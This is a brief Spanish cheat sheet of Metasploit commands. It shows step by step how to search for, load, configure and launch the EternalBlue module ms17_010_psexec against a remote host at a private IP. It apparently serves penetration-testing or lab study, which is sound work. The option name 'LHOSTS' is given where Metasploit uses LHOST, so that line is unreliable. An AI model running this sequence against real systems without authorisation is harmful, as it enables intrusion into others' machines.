## Comandos de metasploit

Iniciar metasploit

	msfconsole

Buscar un exploit una vez identificado la vulnerabilidad

	search exploit [VULNERABILITY]
	search exploit eternalblue

Usar el exploit, poniendo el full path

	use [PATH]
	use exploit/windows/smb/ms17_010_psexec

Ver las opciones disponibles antes de ejecutar el exploit

	show options

Establecer el equipo remoto el cual se va a atacar

	set RHOSTS [IP]	
	set RHOSTS 192.168.122.1

Establecer el equipo local el cual va a realizar el ataque, puede ser la interface

	set LHOSTS [IP]	
	set LHOSTS 192.168.122.10
	set LHOSTS tun0

Chequear si el equipo remoto el cual vamos a atacar es vulnerable

	check

Ejecutar el exploit, cualquiera de las dos opciones

	run
	exploit

	
